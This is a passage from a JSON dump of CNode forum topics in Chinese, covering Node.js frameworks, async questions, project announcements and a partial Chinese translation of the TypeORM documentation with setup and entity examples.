src=\"//static.cnodejs.org/FgOh-8KSCci5PVOT5x1DNufsCUv0\" alt=\"image.png\"></p>\n<p>值得一提的是  nuxt 和 next  都是ssr 渲染框架。 所以可以排除这俩框架在外。</p>\n<p>用于后端开发的，nest.js 目前是第一。 （并且 midway 也借鉴了 nest ），值得一提的是，nest 发布仅仅一年多。</p>\n<p><strong>谁在用nest ？</strong>\n国内目前字节跳动 也在使用 nest 了。\n<a href=\"https://github.com/nestjs/nest/issues/1006\">https://github.com/nestjs/nest/issues/1006</a></p>\n<p>Github 地址：\n<a href=\"https://github.com/nestjs/nest\">https://github.com/nestjs/nest</a></p>\n<p>另外值得关注的是 fastify ，它是node.js 里最快的框架（性能逼近 go 框架 gin）</p>\n<p><a href=\"https://github.com/fastify/fastify\">https://github.com/fastify/fastify</a></p>\n<p><strong>围观地址：</strong>\n<a href=\"https://risingstars.js.org/2018/zh/\">https://risingstars.js.org/2018/zh/</a></p>\n</div>","title":"2018年 JavaScript 明星项目  （谁是最受欢迎的 node.js 框架？）","last_reply_at":"2019-01-21T08:00:15.443Z","good":false,"top":false,"reply_count":2,"visit_count":1277,"create_at":"2019-01-21T04:19:32.168Z","author":{"loginname":"zuohuadong","avatar_url":"https://avatars0.githubusercontent.com/u/11203929?v=4&s=120"}},{"id":"5c3ffcb43898674067a80188","author_id":"5ad86092a7d228c16b987042","tab":"ask","content":"<div class=\"markdown-text\"><p>使用bitbucket + jenkins + docker部署的服务，怎样回滚？有没有成熟的方案推荐一下？</p>\n</div>","title":"docker 版本回滚","last_reply_at":"2019-01-21T07:10:43.946Z","good":false,"top":false,"reply_count":2,"visit_count":835,"create_at":"2019-01-17T03:55:32.056Z","author":{"loginname":"dingyuanwu","avatar_url":"https://avatars0.githubusercontent.com/u/27721756?v=4&s=120"}},{"id":"5c45652b6955112b99437396","author_id":"5ad1f9f3464b1bfa6b425155","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fpy2O417t2aOd8Fk_48MAHXOwzM5\" alt=\"image.png\"></p>\n</div>","title":"用node做代理获取测试数据报error: unable to get local issuer certificate 是怎么回事？","last_reply_at":"2019-01-21T06:22:35.745Z","good":false,"top":false,"reply_count":0,"visit_count":485,"create_at":"2019-01-21T06:22:35.745Z","author":{"loginname":"MEDIOCAL","avatar_url":"https://avatars1.githubusercontent.com/u/22210932?v=4&s=120"}},{"id":"5c41a8c06955112b99436a92","author_id":"57fef4a9fdf3bd3d6511858f","tab":"ask","content":"<div class=\"markdown-text\"><p><a href=\"https://eggjs.org/zh-cn/basics/router.html#restful-%E9%A3%8E%E6%A0%BC%E7%9A%84-url-%E5%AE%9A%E4%B9%89\">https://eggjs.org/zh-cn/basics/router.html#restful-风格的-url-定义</a>\nrouter.resources方式引入的RESTful路由，下边有个表\n有些疑问\nGET\t/posts\tposts\tapp.controllers.posts.index\nGET\t/posts/new\tnew_post\tapp.controllers.posts.new\nGET\t/posts/:id/edit\tedit_post\tapp.controllers.posts.edit\n1.这几个GET路由是页面的路由吗\n2.如果这几个路由不够用怎么办，我能想到的posts列表的接口没有吧</p>\n</div>","title":"关于egg的REST路由","last_reply_at":"2019-01-21T06:07:09.000Z","good":false,"top":false,"reply_count":3,"visit_count":823,"create_at":"2019-01-18T10:21:52.533Z","author":{"loginname":"IEfucker","avatar_url":"https://avatars0.githubusercontent.com/u/3446876?v=4&s=120"}},{"id":"5c430b5b3b948a2b4ab6f922","author_id":"564582ec5e7412b625b8bf16","tab":"ask","content":"<div class=\"markdown-text\"><p>会导致node程序 内存暴涨的场景是哪些？</p>\n<p>来自酷炫的 <a href=\"https://github.com/TakWolf/CNode-Material-Design\">CNodeMD</a></p>\n</div>","title":"会导致node程序 内存暴涨的场景是哪些？","last_reply_at":"2019-01-21T02:55:24.414Z","good":false,"top":false,"reply_count":1,"visit_count":986,"create_at":"2019-01-19T11:34:51.904Z","author":{"loginname":"RajanZhan","avatar_url":"https://avatars1.githubusercontent.com/u/15818327?v=4&s=120"}},{"id":"5c452f943b948a2b4ab6fde2","author_id":"5892cc297274550b057a5cad","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FgxbVrYDLhck2gWjjGWpmrVM5LgG\" alt=\"meet-hve-notes@2x.png\"></p>\n<p>作为一个技术人，你是否喜欢创作，或是怀念过往又或是畅想未来，或是总结技术又或是记录生活？</p>\n<p>诚然，现在有很多平台或技术社区，里面有很多人每天都在分享，或是读书笔记又或是项目实践，或是面试经历又或是年终总结。</p>\n<p>技术社区或平台固然很热闹，但是有一些东西，又想记录在某个地方，只给有缘人。所以这正是个人博客存在的原因之一吧。你可以在自己的博客中记录各种各样的内容，电影影评、旅行日记、编程踩坑经历等等。</p>\n<p>基于此，你可能使用过或正在使用一些流行的工具如 <strong>Hexo</strong>、<strong>Jekyll</strong> 等静态博客网站生成器，又或者是 <strong>Gatsby</strong> 这种新型的 Web 构建工具。不过，你可能在寻找或者期待这样一种工具，可以更便捷地来管理博客和更舒适的编辑内容，于是今天的主角—— <strong>Hve Notes</strong> 诞生了！</p>\n<p>下面奉上介绍给各位喜欢创作的朋友\n<img src=\"//static.cnodejs.org/FpBg_XQWZtmqVRwi-faQfac9SfL9\" alt=\"hve-notes-app.png\"></p>\n<p>👏  欢迎使用 <strong>Hve Notes</strong> ！</p>\n<p>Github: <a href=\"https://github.com/hve-notes/hve-notes\">Hve Notes</a><br>\n项目主页: <a href=\"http://hvenotes.fehey.com/\">Hve Notes</a><br>\n示例网站: <a href=\"http://fehey.com/\">示例网站一</a> <a href=\"http://hve-notes.github.io\">示例网站二</a></p>\n<p>✍️  <strong>Hve Notes</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意… …</p>\n<h2>特性👇</h2>\n<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>\n<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>\n<p>🏷️  你可以对文章进行标签分组</p>\n<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>\n<p>💻  你可以在 <strong>𝖶𝗂𝗇𝖽𝗈𝗐𝗌</strong> 或 <strong>𝖬𝖺𝖼𝖮𝖲</strong> 设备上使用此客户端</p>\n<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>\n<p>💬  你可以进行简单的配置，接入 <a href=\"https://github.com/gitalk/gitalk\">Gitalk</a> 或 <a href=\"https://github.com/SukkaW/DisqusJS\">DisqusJS</a> 评论系统</p>\n<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>\n<p>🌁  你可以任意使用应用内默认主题或任意第三方主题</p>\n<p>🌱 当然 <strong>Hve Notes</strong> 还很年轻，有很多不足，但请相信，它会不停向前🏃</p>\n<p>未来，它一定会成为你离不开的伙伴</p>\n<p>尽情发挥你的才华吧！</p>\n<p>😘 Enjoy~</p>\n<p>目前，<strong>Hve Notes</strong> 已经更新到了 v0.7.0 版本，基本已经可以满足日常使用。当然还有很大的成长空间，例如文章和标签的 <code>slug</code> 格式定制和可编辑，个性化的页面增加与配置，赋予用户更强的扩展能力，更丰富的主题等等。</p>\n<p>在此，也欢迎感兴趣的朋友可以加入我们，提出建议或共同开发，也欢迎加入我们的 <a href=\"https://t.me/joinchat/IDY0ahRqb8NPodv95BNpBg\">Telegram 群组</a></p>\n<p>如果您觉得此项目还不错，欢迎 <a href=\"https://github.com/hve-notes/hve-notes\">Star</a> 支持作者，也欢迎体验之后提出您最宝贵的建议到 <a href=\"https://github.com/hve-notes/hve-notes/issues\">Issue</a></p>\n</div>","title":"遇见创作 · 遇见 Hve Notes","last_reply_at":"2019-01-21T02:33:56.949Z","good":false,"top":false,"reply_count":0,"visit_count":810,"create_at":"2019-01-21T02:33:56.949Z","author":{"loginname":"EryouHao","avatar_url":"https://avatars0.githubusercontent.com/u/17328747?v=4&s=120"}},{"id":"5c445df03b948a2b4ab6fbfc","author_id":"58d83c586f8b9bf02d1d0b1d","tab":"share","content":"<div class=\"markdown-text\"><p>1.‘不要给我钱 我就是爱写代码’ =&gt;  ‘一边写代码一边有钱赚真开心’  =&gt;'好闲啊 我想写代码’  =&gt;‘xs 和  xsmax 买哪个好’\n=&gt;‘这个妹子不错啊’</p>\n<p>欢迎补充</p>\n</div>","title":"写程序的2五个阶段","last_reply_at":"2019-01-21T01:49:59.046Z","good":false,"top":false,"reply_count":2,"visit_count":934,"create_at":"2019-01-20T11:39:28.902Z","author":{"loginname":"ResJay","avatar_url":"https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"}},{"id":"5c3c56f3a4d44449266b0b32","author_id":"5c3c5446a4d44449266b0b01","tab":"share","content":"<div class=\"markdown-text\"><p>ConyEdit不需要切换界面就可以使用各种实用的功能编辑文本，复制即处理，粘贴即结果。开发辅助工具\n<a href=\"https://www.conyedit.com\">https://www.conyedit.com</a></p>\n</div>","title":"学习一套简单语法就可以在Windows上任何地方使用强大的文本编辑功能","last_reply_at":"2019-01-21T01:43:05.338Z","good":false,"top":false,"reply_count":4,"visit_count":847,"create_at":"2019-01-14T09:31:31.883Z","author":{"loginname":"wuguitian","avatar_url":"https://avatars3.githubusercontent.com/u/34082645?v=4&s=120"}},{"id":"5c3dd304a4d44449266b1528","author_id":"53b25565399ed9e07d1e8793","tab":"ask","content":"<div class=\"markdown-text\"><p>用nodejs开发的时候，总会碰到一些莫明其妙的问题，排查到最后，才发现是异步搞的鬼</p>\n<p>比如：</p>\n<ul>\n<li>nodejs里的for循环是异步的吗？</li>\n<li>可以总结为带有回调的都是异步的吗？好像不能这样记，nodejs api里有个读取文件的方法就分为 readFile readFileSync，可气的是它们都是有回调的</li>\n</ul>\n<p>有大佬能不吝赐教讲解一下吗？跪谢！</p>\n<p>另外还有一个问题，循环一个集合有很多方法，for, each, forEach, map等，这些东西里哪些是nodejs内置的？哪些是jquery里的？哪些是es规范里的呢？它们都是同步的还是异步的呢？</p>\n<p>还请原谅我这小白的问题，相信很多学习nodejs的朋友都有过这样的疑惑 :joy</p>\n<hr>\n<p>补充：</p>\n<p>虽然现在 ES 标准里加上了 async await 来实现同步操作，还有 Promise，但业务复杂了，代码还是会被各种回调弄的执行流程出问题</p>\n<p>举个例子</p>\n<p>写 js 的时候用的最多的应该就是回调了，回调里可以传很多个参数，简单的操作，这样写很方便，但业务复杂了，就不方便了，回调地狱也就是这样来的</p>\n<p>这时候你可能会说不是有 Promise 吗，但用这货我觉得也就是把代码变的好看些，拿结果还是要靠 then 方法回调拿</p>\n<p>到这你可能还会说，不是还有 async await 吗，这货确实不用从 then 函数的回调里拿数据了，但用 nodejs 多了就会发现，很多函数的调用的写法还是会用到回调，而且这时候还会在回调函数的前面加上个 async，我也是无语了，这不是又回到起点了吗，如下</p>\n<pre class=\"prettyprint language-js\"><code>it （&#x27;waitBody&#x27;, async function() {\n\tawait driver.sleep(500).wait(&#x27;body&#x27;, 30000).html().then(function(code) {\n    \tisPageError(code).should.be.false;\n    })\n})\n</code></pre><p>当然也有用起来舒服的地方，比如 mongoose 的查询</p>\n<pre class=\"prettyprint language-js\"><code>const results = await UserModel.find({});\n</code></pre><p>综上，难道就没有一个优雅的方法能让代码一行一行的执行吗，前一个结果执行完了，拿到结果再参与下一行代码的执行？</p>\n<p>有人会说了，你上面不是说了 async await 了吗，它不就是这样用的吗？那为啥还要在回调的方法上用 async await 呢？总觉得有点换汤不换药，折腾来折腾去，还是离不了回调，但回调又会涉及到代码结构和流程控制上的问题</p>\n</div>","title":"一直有个疑问，大伙是怎么判断nodejs里一个函数执行是同步的还是异步的？","last_reply_at":"2019-01-20T14:30:20.896Z","good":false,"top":false,"reply_count":12,"visit_count":1267,"create_at":"2019-01-15T12:33:08.974Z","author":{"loginname":"tomoya92","avatar_url":"https://avatars2.githubusercontent.com/u/6915570?v=4&s=120"}},{"id":"5c357b5f5bf06c5e7e3f3099","author_id":"5ba61ea38f5b0c1c59ea10b6","tab":"share","content":"<div class=\"markdown-text\"><h1>SuperMarioGame</h1>\n<h1>github源码：<a href=\"https://github.com/xiugangzhang/SuperMarioGame\">https://github.com/xiugangzhang/SuperMarioGame</a></h1>\n<h2>试玩链接：<a href=\"http://htmlpreview.github.io/?https://github.com/xiugangzhang/SuperMarioGame/blob/master/index.html\">http://htmlpreview.github.io/?https://github.com/xiugangzhang/SuperMarioGame/blob/master/index.html</a></h2>\n<h2>备用链接：<a href=\"http://vip.52tech.tech/www/game/SuperMarioGame/index.html\">http://vip.52tech.tech/www/game/SuperMarioGame/index.html</a></h2>\n<p><img src=\"//static.cnodejs.org/FqaXcTJrtAqv_ApWpJLqwJFAjVRt\" alt=\"00.jpg\"></p>\n<ul>\n<li>V1.0 : 实现游戏场景的初始化</li>\n<li>V2.0: 实现画布的不断刷新</li>\n<li>V3.0: 实现了游戏中人物的运动</li>\n<li>V4.0: 实现了js代码的分离</li>\n<li>V5.0：实现键盘对人物移动的控制</li>\n<li>V6.0：完成Game游戏类的封装</li>\n<li>V7.0： 实现敌人角色的加入, player，enemy类的封装; 实现了我方角色和敌人角色的自由移动</li>\n<li>V8.0： 实现精灵之间的碰撞检测功能</li>\n<li>V9.0： 实现游戏中分数的统计， 输赢的判定</li>\n<li>V10.0: 实现了游戏背景的滚动效果和场景的优化</li>\n</ul>\n</div>","title":"试下这个超级玛丽奥游戏，看下自己能不能撑过30秒？","last_reply_at":"2019-01-20T05:59:05.608Z","good":false,"top":false,"reply_count":9,"visit_count":1371,"create_at":"2019-01-09T04:41:03.025Z","author":{"loginname":"xiugangzhang","avatar_url":"https://avatars3.githubusercontent.com/u/29092258?v=4&s=120"}},{"id":"5c3f1323a4d44449266b1be4","author_id":"59e6c301bcfcc03162f2ffc3","tab":"share","content":"<div class=\"markdown-text\"><p>esm 本身出现就是为了 让web 模块化的,\n结果 浏览器 esm 运行不了\nimport lodash from 'lodash '\n然后为了解决方案来了 browserify =&gt;webpack , 然后问题又来了:\nnode.js 本身 不支持esm 然后你们这样写 node.js 又得用babel转换!\n(  语法不支持  esmify 转换), webpack |browserify 去打包,编译了…\n不然就没法运行\n然后看了半天人家的打包配置: 把async 语法都编译成 node.js 低版本的东西了…(我不知道怎么禁用 )\n要调试怎么办 生成 .map 文件嘛 ;然后各种百度谷歌找配置方法。\n浏览器和node.js 共同的解决方案:</p>\n<ol>\n<li>采用目前的require ， 浏览器中对代码做语法解析，采用ast 语法 搜寻出 require(“module”) ；然后按一定的规则预先加载所需模块，这样是个好解决方法。\n(语法解析有var 变量提前定义， 以及eval 语法分析， 再加require 语法分析是一个可行方案。)</li>\n<li>这种方法 不会因为 require 加载模块而导致js 阻塞。而对于没有加载到的动态模块，可以采用用配置文件并预先加载到缓存，不执行模块内容；</li>\n<li>语法一致性</li>\n</ol>\n</div>","title":"esm 你退群吧","last_reply_at":"2019-01-19T06:23:09.762Z","good":false,"top":false,"reply_count":15,"visit_count":1778,"create_at":"2019-01-16T11:18:59.597Z","author":{"loginname":"spitWind","avatar_url":"https://avatars2.githubusercontent.com/u/18753430?v=4&s=120"}},{"id":"5c41841b3898674067a8083c","author_id":"56efaf9802c237a73a1a89a2","tab":"ask","content":"<div class=\"markdown-text\"><p>我在element-ui官网使用vimium时，当失去焦点时候，就无法进行滚动了，大家有碰到过这种情况吗？怎么解决啊？我把网址发出来http://element-cn.eleme.io/#/zh-CN/component/date-picker</p>\n</div>","title":"有没人用过vimium,请教一个问题啊","last_reply_at":"2019-01-19T05:21:44.216Z","good":false,"top":false,"reply_count":1,"visit_count":847,"create_at":"2019-01-18T07:45:31.118Z","author":{"loginname":"lyt308012546","avatar_url":"https://avatars1.githubusercontent.com/u/10969445?v=4&s=120"}},{"id":"5c41a5776955112b99436a7b","author_id":"5ad409dbba60fcc66b7b817c","tab":"ask","content":"<div class=\"markdown-text\"><p>无奈搜不到，只能当伸手党了，求好人施舍\n主要是手动去做太无聊了，得一个个校对 ，还的去查地区\n我想应该有前人做好了，可是关键字搜不到😢</p>\n</div>","title":"求助：请问哪里可以找到一份世界大洲及代表地区与时区的sql映射表呢","last_reply_at":"2019-01-18T10:07:51.947Z","good":false,"top":false,"reply_count":0,"visit_count":785,"create_at":"2019-01-18T10:07:51.947Z","author":{"loginname":"phper-chen","avatar_url":"https://avatars0.githubusercontent.com/u/20152358?v=4&s=120"}},{"id":"5ac073b852d7d3a8698a49f4","author_id":"57abe0de476898b472247de2","tab":"share","content":"<div class=\"markdown-text\"><p>目前正在翻译中文文档，期待大家的一起参与：</p>\n<p><a href=\"https://github.com/huanz/typeorm.github.io\">typeorm中文文档 </a></p>\n<p>中文文档地址：<a href=\"http://typeorm.cn/\">http://typeorm.cn/</a></p>\n<p><a href=\"http://typeorm.io/\"><img src=\"https://github.com/typeorm/typeorm/raw/master/resources/logo_big.png\" alt=\"TypeORM\"></a></p>\n<p>TypeORM是一个<a href=\"https://en.wikipedia.org/wiki/Object-relational_mapping\">ORM</a>框架，它可以运行在NodeJS、浏览器、Cordova、PhoneGap和Ionic平台上，可以与TypeScript和JavaScript (ES5, ES6, ES7)一起使用。\n它的目标是始终支持最新的JavaScript特性并提供额外的特性以帮助你开发任何使用数据库的应用程序 —— 不管是只有几张表的小型应用还是拥有多数据库的大型企业应用。</p>\n<p>不同于现有的所有其他JavaScript ORM框架，TypeORM支持Active Record和Data Mapper模式，这意味着你用最有效的方法编写高质量的、松耦合的、可扩展的、可维护的应用程序。</p>\n<p>TypeORM受到了参考了很多其他优秀ORM的实现, 比如 <a href=\"http://hibernate.org/orm/\">Hibernate</a>, <a href=\"http://www.doctrine-project.org/\">Doctrine</a> 和 <a href=\"https://www.asp.net/entity-framework\">Entity Framework</a>.</p>\n<p>TypeORM 的一些特性：</p>\n<ul>\n<li>支持Active Record和Data Mapper（你可以自由选择）</li>\n<li>实体和列</li>\n<li>数据库特性列类型</li>\n<li>实体管理</li>\n<li>存储库和自定义存储\b库</li>\n<li>清洁对象关系模型</li>\n<li>关联（关系）</li>\n<li>贪婪和延迟关系</li>\n<li>单向的，双向的和自引用的关系</li>\n<li>支持多重继承模式</li>\n<li>级联</li>\n<li>索引</li>\n<li>事务</li>\n<li>迁移和自动迁移</li>\n<li>连接池</li>\n<li>复制</li>\n<li>使用多个数据库连接</li>\n<li>使用多个数据库类型</li>\n<li>跨数据库和跨模式查询</li>\n<li>优雅的语法，灵活而强大的QueryBuilder</li>\n<li>左联接和内联接</li>\n<li>准确的分页连接查询</li>\n<li>查询缓存</li>\n<li>原始结果流</li>\n<li>日志</li>\n<li>监听者和订阅者（钩子）</li>\n<li>支持闭包表模式</li>\n<li>在模型或者分离的配置文件中声明模式</li>\n<li>json / xml / yml / env格式的连接配置</li>\n<li>支持 MySQL / MariaDB / Postgres / SQLite / Microsoft SQL Server / Oracle / WebSQL / sql.js</li>\n<li>支持 MongoDB NoSQL 数据库</li>\n<li>在NodeJS / 浏览器 / Ionic / Cordova / Electron平台上工作</li>\n<li>支持 TypeScript 和 JavaScript</li>\n<li>产生出高性能、灵活、清洁和可维护的代码</li>\n<li>遵循所有可能的最佳实践</li>\n<li>命令行工具</li>\n</ul>\n<p>还有更多…</p>\n<p>使用TypeORM你的模型是这样的：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, PrimaryGeneratedColumn, Column} from &quot;typeorm&quot;;\n\n@Entity()\nexport class User {\n\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column()\n    firstName: string;\n\n    @Column()\n    lastName: string;\n\n    @Column()\n    age: number;\n\n}\n</code></pre><p>你的域逻辑是这样的：</p>\n<pre class=\"prettyprint language-typescript\"><code>const user = new User();\nuser.firstName = &quot;Timber&quot;;\nuser.lastName = &quot;Saw&quot;;\nuser.age = 25;\nawait repository.save(user);\n\nconst allUsers = await repository.find();\nconst firstUser = await repository.findOneById(1);\nconst timber = await repository.findOne({ firstName: &quot;Timber&quot;, lastName: &quot;Saw&quot; });\n\nawait repository.remove(timber);\n</code></pre><p>或者，你如果你喜欢使用“ActiveRecord”实现，你也可以使用它：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, PrimaryGeneratedColumn, Column, BaseEntity} from &quot;typeorm&quot;;\n\n@Entity()\nexport class User extends BaseEntity {\n\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column()\n    firstName: string;\n\n    @Column()\n    lastName: string;\n\n    @Column()\n    age: number;\n\n}\n</code></pre><p>你的域逻辑是这样的：</p>\n<pre class=\"prettyprint language-typescript\"><code>const user = new User();\nuser.firstName = &quot;Timber&quot;;\nuser.lastName = &quot;Saw&quot;;\nuser.age = 25;\nawait user.save();\n\nconst allUsers = await User.find();\nconst firstUser = await User.findOneById(1);\nconst timber = await User.findOne({ firstName: &quot;Timber&quot;, lastName: &quot;Saw&quot; });\n\nawait timber.remove();\n</code></pre><h2>请注意</h2>\n<p>这个文档可能不是最新的。\n可以去<a href=\"http://typeorm.io\">官网</a>查看最新的英文文档。\n非常欢迎你的贡献。</p>\n<h2>安装</h2>\n<ol>\n<li>\n<p>安装TypeORM:</p>\n<p><code>npm install typeorm --save</code></p>\n</li>\n<li>\n<p>需要安装依赖模块 <code>reflect-metadata</code> :</p>\n<p><code>npm install reflect-metadata --save</code></p>\n<p>在应用里全局引用一下:</p>\n<ul>\n<li>比如在app.ts的入口处 <code>require(&quot;reflect-metadata&quot;)</code></li>\n</ul>\n</li>\n<li>\n<p>你可能需要安装node类型：</p>\n<p><code>npm install @types/node --save</code></p>\n</li>\n<li>\n<p>安装数据库驱动:</p>\n<ul>\n<li>\n<p><strong>MySQL</strong> 或 <strong>MariaDB</strong></p>\n<p><code>npm install mysql --save</code></p>\n</li>\n<li>\n<p><strong>PostgreSQL</strong></p>\n<p><code>npm install pg --save</code></p>\n</li>\n<li>\n<p><strong>SQLite</strong></p>\n<p><code>npm install sqlite3 --save</code></p>\n</li>\n<li>\n<p><strong>Microsoft SQL Server</strong></p>\n<p><code>npm install mssql --save</code></p>\n</li>\n<li>\n<p><strong>sql.js</strong></p>\n<p><code>npm install sql.js --save</code></p>\n</li>\n<li>\n<p><strong>Oracle</strong> (experimental)</p>\n<p><code>npm install oracledb --save</code></p>\n</li>\n</ul>\n<p>可以根据你的数据库选择安装上面的任意一个.</p>\n<p>使用oracle驱动需要参考安装说明：<a href=\"https://github.com/oracle/node-oracledb\">地址</a>.</p>\n</li>\n</ol>\n<h4>TypeScript配置</h4>\n<p>确保你的TypeScript编译器的版本大于<strong>2.3</strong>，并且在<code>tsconfig.json</code>开启下面设置:</p>\n<pre class=\"prettyprint language-json\"><code>&quot;emitDecoratorMetadata&quot;: true,\n&quot;experimentalDecorators&quot;: true,\n</code></pre><p>同时需要开启编译选项里的<code>lib</code>下的<code>es6</code>或者从<code>@typings</code>安装<code>es6-shim</code></p>\n<h2>快速开始</h2>\n<p>开始使用TypeORM的最快方法是使用它的CLI命令生成一个初始项目。\n快速开始只有在NodeJS应用程序中使用TypeORM才可以使用。\n如果你正在使用其他平台，请看<a href=\"#%E5%88%86%E6%AD%A5%E6%8C%87%E5%8D%97\">分步指南</a>。</p>\n<p>首先全局安装TypeORM：</p>\n<pre class=\"prettyprint\"><code>npm install typeorm -g\n</code></pre><p>然后转到新项目的目录并运行该命令：</p>\n<pre class=\"prettyprint\"><code>typeorm init --name MyProject --database mysql\n</code></pre><p><code>name</code>即项目的名称，<code>database</code>是你将使用的数据库。数据库可以是下列值之一：<code>mysql</code>、<code>mariadb</code>、<code>postgres</code>、<code>sqlite</code>、<code>mssql</code>、<code>oracle</code>，<code>websql</code>、<code>mongodb</code>。</p>\n<p>该命令将在<code>MyProject</code>目录中生成一个新项目，其中包含以下文件：</p>\n<pre class=\"prettyprint\"><code>MyProject\n├── src              &#x2F;&#x2F; 放你的 TypeScript 代码\n│   ├── entity       &#x2F;&#x2F; 放实体（数据库模型）的目录\n│   │   └── User.ts  &#x2F;&#x2F; 实体的案例\n│   ├── migration    &#x2F;&#x2F; 迁移文件目录\n│   └── index.ts     &#x2F;&#x2F; 应用程序入口\n├── .gitignore       &#x2F;&#x2F; 标准git忽略文件\n├── ormconfig.json   &#x2F;&#x2F; ORM和数据连接配置\n├── package.json     &#x2F;&#x2F; node模块依赖\n├── README.md        &#x2F;&#x2F; 简单的说明文件\n└── tsconfig.json    &#x2F;&#x2F; TypeScript编译配置\n</code></pre><blockquote>\n<p>你也可以在现有的node项目目录执行<code>typeorm init</code>，但是一定要小心 - 它可能会覆盖你已经有的一些文件。</p>\n</blockquote>\n<p>下一步是安装项目依赖</p>\n<pre class=\"prettyprint\"><code>cd MyProject\nnpm install\n</code></pre><p>在安装过程中，修改 <code>ormconfig.json</code> 文件将自己的数据库连接配置选项放在其中：</p>\n<pre class=\"prettyprint language-json\"><code>{\n   &quot;type&quot;: &quot;mysql&quot;,\n   &quot;host&quot;: &quot;localhost&quot;,\n   &quot;port&quot;: 3306,\n   &quot;username&quot;: &quot;test&quot;,\n   &quot;password&quot;: &quot;test&quot;,\n   &quot;database&quot;: &quot;test&quot;,\n   &quot;synchronize&quot;: true,\n   &quot;logging&quot;: false,\n   &quot;entities&quot;: [\n      &quot;src&#x2F;entity&#x2F;**&#x2F;*.ts&quot;\n   ],\n   &quot;migrations&quot;: [\n      &quot;src&#x2F;migration&#x2F;**&#x2F;*.ts&quot;\n   ],\n   &quot;subscribers&quot;: [\n      &quot;src&#x2F;subscriber&#x2F;**&#x2F;*.ts&quot;\n   ]\n}\n</code></pre><p>通常来说，大多数时候你只需要配置<code>host</code>，<code>username</code>，<code>password</code>，<code>database</code> 或者 <code>port</code> 选项。</p>\n<p>配置和模块安装都完成之后，就可以运行应用程序了：</p>\n<pre class=\"prettyprint\"><code>npm start\n</code></pre><p>就是这样，你的应用程序应该成功地运行并将一个新用户插入到数据库中。\n你可以继续这个项目，集成你需要的其他模块，并创建更多的实体。</p>\n<blockquote>\n<p>运行<code>typeorm init --name MyProject --database mysql --express</code>命令可以安装<code>express</code>，生成一个更高级的项目。</p>\n</blockquote>\n<h2>分步指南</h2>\n<p>你对ORM的期望是什么？\n首先，你预期它将为你创建数据库表，并查找/插入/更新/删除你的数据，而不必编写大量难以维护的SQL查询。\n本指南将向你展示如何从头开始设置TypeORM，并让它按照你所期望的ORM进行。</p>\n<h3>创建模型</h3>\n<p>与数据库一起工作从创建表开始。\n如何告诉TypeORM创建一个数据库表？\n答案是 - 通过模型。\n你的应用程序中的模型就是你的数据库中的表。</p>\n<p>例如你有一个 <code>Photo</code> 模型：</p>\n<pre class=\"prettyprint language-typescript\"><code>export class Photo {\n    id: number;\n    name: string;\n    description: string;\n    filename: string;\n    views: number;\n}\n</code></pre><p>你想在你的数据库中存储照片。\n要在数据库中存储东西，首先需要一个数据库表，并从模型创建数据库表。\n不是所有的模型，而仅仅是那些你定义为<em>实体</em>。</p>\n<h3>创建实体</h3>\n<p><em>实体</em>是你用 <code>@Entity</code> 装饰的模型。\n将为这些模型创建一个数据库表。\n使用TypeORM你将在任何地方使用实体。\n你可以使用他们加载/插入/更新/删除并执行其他操作。</p>\n<p>让我们把<code>Photo</code>模型变成一个实体：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity} from &quot;typeorm&quot;;\n\n@Entity()\nexport class Photo {\n    id: number;\n    name: string;\n    description: string;\n    filename: string;\n    views: number;\n    isPublished: boolean;\n}\n</code></pre><p>现在，将会为 <code>Photo</code> 实体创建一个数据库表，我们能够在应用程序的任何地方使用它。\n我们已经创建了一个数据库表，然而没有列的表示不存在的。\n让我们在数据库表中创建一些列吧。</p>\n<h3>添加数据库表列</h3>\n<p>要添加数据库列，只需要将生成的实体的属性用 <code>@Column</code> 装饰。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column} from &quot;typeorm&quot;;\n\n@Entity()\nexport class Photo {\n\n    @Column()\n    id: number;\n\n    @Column()\n    name: string;\n\n    @Column()\n    description: string;\n\n    @Column()\n    filename: string;\n\n    @Column()\n    views: number;\n\n    @Column()\n    isPublished: boolean;\n}\n</code></pre><p>现在 <code>id</code>，<code>name</code>，<code>description</code>，<code>filename</code>，<code>views</code> 和 <code>isPublished</code> 列将会被添加 <code>photo</code> 表。\n数据库中的列类型是从你使用的属性类型推断出来的，例如：<code>number</code> 将会被转成 <code>integer</code>，<code>string</code> 转为 <code>varchar</code>，<code>boolean</code> 转为 <code>bool</code>，等。\n但是你可以通过隐式在 <code>@Column</code> 装饰器传入类型将列类型指定为任何你数据库支持的类型。</p>\n<p>我们生成了一个带有列的数据库表，但是还剩下一件事。\n每个数据库表必须有一个带有主键的列。</p>\n<h3>创建一个主键列</h3>\n<p>每个表都<strong>必须</strong>至少有一个主键列。这是一个要求，你不能避免。要使列成为主键，你需要使用 <code>@PrimaryColumn</code> 修饰符。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryColumn} from &quot;typeorm&quot;;\n\n@Entity()\nexport class Photo {\n\n    @PrimaryColumn()\n    id: number;\n\n    @Column()\n    name: string;\n\n    @Column()\n    description: string;\n\n    @Column()\n    filename: string;\n\n    @Column()\n    views: number;\n\n    @Column()\n    isPublished: boolean;\n}\n</code></pre><h3>创建一个自动生成的列</h3>\n<p>现在，假设你希望将id列自动生成(这就是所谓的自动递增/按顺序/连续的/生成唯一标识列)。\n要做到这一点，你需要将 <code>@PrimaryColumn</code> 修饰符更改为 <code>@PrimaryGeneratedColumn</code> 修饰符：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryGeneratedColumn} from &quot;typeorm&quot;;\n\n@Entity()\nexport class Photo 